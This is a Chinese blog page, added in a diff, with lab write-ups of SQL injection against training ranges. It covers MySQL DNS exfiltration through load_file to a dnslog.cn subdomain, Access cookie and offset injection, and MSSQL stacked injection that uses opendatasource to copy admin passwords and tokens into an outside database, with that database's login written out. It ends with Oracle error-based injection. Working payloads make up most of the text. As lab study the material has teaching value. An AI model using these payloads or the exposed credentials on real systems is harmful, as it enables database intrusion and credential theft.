@@ -1,0 +1,363 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>zkaq-数据库注入 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2023-12-23">2023年12月23日</time>
+        
+        
+          <span class="post__readtime">13 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/zkaq/">#zkaq</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">zkaq-数据库注入</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <!-- toc -->
+
+<h1 id="MYSQL-注入-Dns注入"><a href="#MYSQL-注入-Dns注入" class="headerlink" title="MYSQL 注入 - Dns注入"></a>MYSQL 注入 - Dns注入</h1><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>1.dnslog</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用来记录dns被解析的信息</span><br></pre></td></tr></table></figure>
+
+<p>2.dns注入思路</p>
+<p>进行注入攻击时，页面无正常回显，使用第三方dnslog平台，通过记录dns解析的信息外带注入数据，将盲注转化成显错注入。</p>
+<h4 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h4><p>判断是否存在注入攻击时遇到waf</p>
+<p><img src="/../img/Typora/image-20231223171656439.png" alt="image-20231223171656439"></p>
+<p>使用参数污染进行绕过</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2/*&amp;id=1 and sleep(3) -- a*/ //页面延时响应，判断存在注入点</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../img/Typora/image-20231223171846777.png" alt="image-20231223171846777"></p>
+<p>爆库名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2/*&amp;id=1 and (select load_file(concat(&quot;\\\\&quot;,database(),&quot;.zlmwoy.dnslog.cn\\1.txt&quot;))) -- a*/ </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231223173119274.png" alt="image-20231223173119274"></p>
+<p>爆表名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=2/*&amp;id=1 and (select load_file(concat(&quot;\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;.zlmwoy.dnslog.cn\\1.txt&quot;))) -- a*/      		//得到表名admin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id=2/*&amp;id=1 and (select load_file(concat(&quot;\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&quot;.zlmwoy.dnslog.cn\\1.txt&quot;))) -- a*/				//得到表名news </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231223173427337.png" alt="image-20231223173427337"></p>
+<p>爆字段</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=2/*&amp;id=1 and (select load_file(concat(&quot;\\\\&quot;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;admin&#x27; limit 0,1),&quot;.zlmwoy.dnslog.cn\\1.txt&quot;))) -- a*/				//查到字段id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id=2/*&amp;id=1 and (select load_file(concat(&quot;\\\\&quot;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;admin&#x27; limit 1,1),&quot;.zlmwoy.dnslog.cn\\1.txt&quot;))) -- a*/				//查到字段username</span><br><span class="line"></span><br><span class="line">id=2/*&amp;id=1 and (select load_file(concat(&quot;\\\\&quot;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;admin&#x27; limit 2,1),&quot;.zlmwoy.dnslog.cn\\1.txt&quot;))) -- a*/				//查到字段password</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../img/Typora/image-20231223174003084.png" alt="image-20231223174003084"></p>
+<p>查看数据</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2/*&amp;id=1 and (select load_file(concat(&quot;\\\\&quot;,(select password from admin limit 0,1),&quot;.zlmwoy.dnslog.cn\\1.txt&quot;))) -- a*/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231223174422354.png" alt="image-20231223174422354"></p>
+<h1 id="Access数据库cookie注入"><a href="#Access数据库cookie注入" class="headerlink" title="Access数据库cookie注入"></a>Access数据库cookie注入</h1><h2 id="一、什么是cookie注入"><a href="#一、什么是cookie注入" class="headerlink" title="一、什么是cookie注入?"></a>一、什么是cookie注入?</h2><p>Cookie 注入是一种安全漏洞，攻击者通过在用户的浏览器中操纵或注入恶意的 Cookie 数据，来实施攻击。</p>
+<h2 id="二、Access数据库与mySQL数据区的小区别"><a href="#二、Access数据库与mySQL数据区的小区别" class="headerlink" title="二、Access数据库与mySQL数据区的小区别"></a>二、Access数据库与mySQL数据区的小区别</h2><p>1.limit是mySQL数据库特有的语法。</p>
+<p>2.Access数据库中无information_schema库</p>
+<h2 id="三、进行cookie注入时的几个函数说明"><a href="#三、进行cookie注入时的几个函数说明" class="headerlink" title="三、进行cookie注入时的几个函数说明"></a>三、进行cookie注入时的几个函数说明</h2><p><strong>document.cookie：</strong>JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。</p>
+<p><strong>escape：</strong>escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</p>
+<p><strong>exists：</strong>exists运算符用于判断查询子句是否有记录，如果有一条或多条记录存在返回 True，否则返回 False。</p>
+<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>点进一个网页，发现有传参</p>
+<p><img src="/../img/Typora/image-20240119192818822.png" alt="image-20240119192818822"></p>
+<p>and 被过滤</p>
+<p><img src="/../img/Typora/image-20240119193041760.png" alt="image-20240119193041760"></p>
+<p>尝试进行cookie注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171	页面回显正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240119193318230.png" alt="image-20240119193318230"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=172 页面内容变化后端接收cookie传的参数能对页面产生影响</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240119193611778.png" alt="image-20240119193611778"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id =171 and 1=1 页面正常</span><br><span class="line">id =171 and 1=2 页面报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240119194313921.png" alt="image-20240119194313921"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=171 order by 10页面正常</span><br><span class="line">id=171 order by 11页面报错</span><br><span class="line"></span><br><span class="line">有十个字段</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171 and exists(select * from admin) 正常，存在admin表</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171 and exists(select id,password,username from)正常，存在id、password、username字段。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171 union select 1,2,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure>
+
+<p>判断回显点</p>
+<p><img src="/../img/Typora/image-20240119201237698.png" alt="image-20240119201237698"></p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171 union select 1,admin,3,4,5,6,password,8,9,10 from admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240119201340283.png" alt="image-20240119201340283"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line">密码：b9a2a2b5dffb918c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240119201903492.png" alt="image-20240119201903492"></p>
+<p><img src="/../img/Typora/image-20240119201934403.png" alt="image-20240119201934403"></p>
+<h1 id="Access数据库偏移注入"><a href="#Access数据库偏移注入" class="headerlink" title="Access数据库偏移注入"></a>Access数据库偏移注入</h1><h2 id="一、什么是偏移注入"><a href="#一、什么是偏移注入" class="headerlink" title="一、什么是偏移注入?"></a>一、什么是偏移注入?</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">偏移注入是一种注入姿势，可以根据一个较多字段的表对一个少字段的表进行偏移注入，一般是联合查询，在页面有回显点的情况下</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、使用偏移注入的场景。"><a href="#二、使用偏移注入的场景。" class="headerlink" title="二、使用偏移注入的场景。"></a>二、使用偏移注入的场景。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在SQL注入的时候会遇到一些无法查询列名的问题</span><br><span class="line">当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>靶场练习</p>
+<p>设置cookie为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=105 //页面回显正常发现是接受cookie 传参的</span><br></pre></td></tr></table></figure>
+
+<p>猜测存在admin表</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=105 and exist(select * from admin)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240119211532298.png" alt="image-20240119211532298"></p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=105 order by 26页面正常</span><br><span class="line">id=105 order by 27页面报错</span><br><span class="line"></span><br><span class="line">判断有26个字段</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240119212510056.png" alt="image-20240119212510056"></p>
+<p>只有3、5、7三个字段用偏移注入只能看前七个字段的数据</p>
+<p>分别是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.1</span><br><span class="line">2.admin</span><br><span class="line">3. b9a2a2b5dffb918c</span><br><span class="line">4.1</span><br><span class="line">5.192.168.0.21</span><br><span class="line">6.2024-1-20 3:04:17</span><br><span class="line">7.2003-9-25 23:13:38</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=105 and 1=2 union select 1897987,2897987,3897987,4897987,5897987,6897987,7897987,8897987,9897987,10897987,11897987,12897987,13897987,14897987,15897987,16897987,17897987,18897987,19897987,20897987,21897987,22897987,23897987,24897987,25897987,26897987 from admin</span><br></pre></td></tr></table></figure>
+
+<p>查看源码搜索897987</p>
+<p>发现25是隐藏回显点</p>
+<p><img src="/../img/Typora/image-20240119214207658.png" alt="image-20240119214207658"></p>
+<p>可以查到15 16字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">15.zkaq&#123;f0e12dafb6&#125;</span><br><span class="line">16. width=&quot;450&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="MSSQL数据库的反弹注入"><a href="#MSSQL数据库的反弹注入" class="headerlink" title="MSSQL数据库的反弹注入"></a>MSSQL数据库的反弹注入</h1><h2 id="一、什么是反弹注入"><a href="#一、什么是反弹注入" class="headerlink" title="一、什么是反弹注入"></a>一、什么是反弹注入</h2><p>反弹注入利用opendatasource函数将查询结果外带到攻击者的数据库中</p>
+<h2 id="二、进行反弹注入条件"><a href="#二、进行反弹注入条件" class="headerlink" title="二、进行反弹注入条件"></a>二、进行反弹注入条件</h2><p>需要目标存在堆叠注入、还需要有一个部署在公网的数据库</p>
+<h2 id="三、MSSQL数据库的特点"><a href="#三、MSSQL数据库的特点" class="headerlink" title="三、MSSQL数据库的特点"></a>三、MSSQL数据库的特点</h2><ul>
+<li>MSSQL数据库查库名的函数是db_name()可以用此函数来判断数据库类型</li>
+<li>MSSQL数据库联合查询对应的字段数及数据类型要相同(null可以与任何类型匹配)</li>
+<li>sysobjects:包含MSSQL数据库的所有表名</li>
+<li>xtype：指对象类型</li>
+<li>id：对象标识号（每个id对应唯一表）</li>
+<li>waitfor delay ‘0:0:10’ ：MSSQL数据库中的延时函数</li>
+</ul>
+<h2 id="靶场练习-1"><a href="#靶场练习-1" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>后面拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">order by 3页面正常</span><br><span class="line">order by 4页面报错</span><br><span class="line"></span><br><span class="line">有3个字段</span><br></pre></td></tr></table></figure>
+
+<p>爆库名无法用函数database(),可以用db_name()</p>
+<p>所以用的数据库是MSSQL数据库</p>
+<p>爆表名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select id,name,&#x27;a&#x27; from sysobjects where xtype=&#x27;U&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240121001836592.png" alt="image-20240121001836592"></p>
+<p>爆字段名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,name,&#x27;a&#x27; from syscolumns where id=&#x27;1977058079&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240121002208645.png" alt="image-20240121002208645"></p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;;waitfor delay &#x27;0:0:10&#x27; ; -- a</span><br></pre></td></tr></table></figure>
+
+<p>有延时存在堆叠注入</p>
+<p>连接数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=den1.mssql8.gear.host;uid=zkaqzkaq1n;pwd=Rz7VjmvQ!6e~;database=zkaqzkaq1n;&#x27;).zkaqzkaq1n.dbo.Yliken1 select id,passwd,username,token from admin; -- 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240121002236443.png" alt="image-20240121002236443"></p>
+<p>zkaq{e9c9e67c5} </p>
+<h1 id="Oracle数据库的报错注入"><a href="#Oracle数据库的报错注入" class="headerlink" title="Oracle数据库的报错注入"></a>Oracle数据库的报错注入</h1><h2 id="一、Oracle数据库的特点"><a href="#一、Oracle数据库的特点" class="headerlink" title="一、Oracle数据库的特点"></a>一、Oracle数据库的特点</h2><ul>
+<li>Oracle 很死板  非常讲究语法格式</li>
+<li>Oracle数据库中库的概念被弱化 用户被强化。一个用户代表一个库</li>
+<li>Oracle数据库中存在一个虚表——Dual 表。dual是Oracle的虚拟表，用来构成select的语法规则</li>
+</ul>
+<h2 id="二、相关函数"><a href="#二、相关函数" class="headerlink" title="二、相关函数"></a>二、相关函数</h2><p><strong>rownum：</strong>rownum是Oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，返回的第二行分配的是2，这个为字段可以用于限制返回查询的总行数，且rownum不可以以任何表的名称作为前缀。</p>
+<p><strong>all_tables :</strong> 当前用户有权限的表的信息</p>
+<p><strong>user_tables:</strong> 当前用户名下的表的信息</p>
+<p><strong>ALL_ALL_TABLES：</strong>某一用户拥有的或有访问权限的对象和表</p>
+<p><strong>USER_ALL_TABLES：</strong>某一用户所拥有的对象和表</p>
+<p><strong>ctxsys.drithsx.sn：</strong>用于处理文本，也会出现参数错误返回异常</p>
+<p><strong>all_tab_columns ：</strong>某一用户拥有的或有访问权限字段</p>
+<p><strong>user_tab_columns：</strong> 查询出当前用户的字段</p>
+<h2 id="靶场练习-2"><a href="#靶场练习-2" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>1、判断是否存在注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">拼接and 1=1 页面正常</span><br><span class="line">拼接and 1=2 页面报错</span><br><span class="line">存在注入点</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240121203343909.png" alt="image-20240121203343909"></p>
+<p><img src="/../img/Typora/image-20240121203332622.png" alt="image-20240121203332622"></p>
+<p>2、判断字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拼接order by 4页面正常</span><br><span class="line">拼接order by 5页面报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240121203454130.png" alt="image-20240121203454130"></p>
+<p><img src="/../img/Typora/image-20240121203502654.png" alt="image-20240121203502654"></p>
+<p>3、判断回显点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">拼接and 1=2 union select null,null,null,null from dual</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240121203742800.png" alt="image-20240121203742800"></p>
+<p>发现只有第四个有回显，且为int型</p>
+<p>3、利用报错来爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=ctxsys.drithsx.sn(1,(select table_name from (select table_name,rownum n from user_tables) where n=1))</span><br><span class="line">and 1=ctxsys.drithsx.sn(1,(select table_name from (select table_name,rownum n from user_tables) where n=2))</span><br><span class="line">and 1=ctxsys.drithsx.sn(1,(select table_name from (select table_name,rownum n from user_tables) where n=3))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240121204819810.png" alt="image-20240121204819810"></p>
+<p><img src="/../img/Typora/image-20240121204857056.png" alt="image-20240121204857056"></p>
+<p><img src="/../img/Typora/image-20240121204914412.png" alt="image-20240121204914412"></p>
+<p>4、爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=ctxsys.drithsx.sn(1,(select column_name from (select column_name,rownum n from user_tab_columns where table_name=&#x27;ADMIN&#x27;) where n=1))</span><br><span class="line">and 1=ctxsys.drithsx.sn(1,(select column_name from (select column_name,rownum n from user_tab_columns where table_name=&#x27;ADMIN&#x27;) where n=2))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240121205342649.png" alt="image-20240121205342649"></p>
+<p><img src="/../img/Typora/image-20240121205404021.png" alt="image-20240121205404021"></p>
+<p>5、查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=ctxsys.drithsx.sn(1,(select UPASS from (select UPASS,rownum n from ADMIN) where n=1))</span><br><span class="line">and 1=ctxsys.drithsx.sn(1,(select UPASS from (select UPASS,rownum n from ADMIN) where n=2))</span><br><span class="line">and 1=ctxsys.drithsx.sn(1,(select UPASS from (select UPASS,rownum n from ADMIN) where n=3))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240121205734455.png" alt="image-20240121205734455"></p>
+<p><img src="/../img/Typora/image-20240121205749928.png" alt="image-20240121205749928"></p>
+<p><img src="/../img/Typora/image-20240121205807204.png" alt="image-20240121205807204"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-06">2024·03·06</time>
+          <a class="related__link" href="/2024/03/06/%E5%9F%BA%E7%A1%80/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则表达式</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-05">2024·03·05</time>
+          <a class="related__link" href="/2024/03/05/%E5%9F%BA%E7%A1%80/SSIT%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI模板注入</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-04">2024·03·04</time>
+          <a class="related__link" href="/2024/03/04/%E5%9F%BA%E7%A1%80/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">zkaq-代码执行</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2023/12/24/%E5%9F%BA%E7%A1%80/CTF-show/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">CTF-show</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2023/12/22/%E5%9F%BA%E7%A1%80/upload/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">zkaq-upload-labs</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
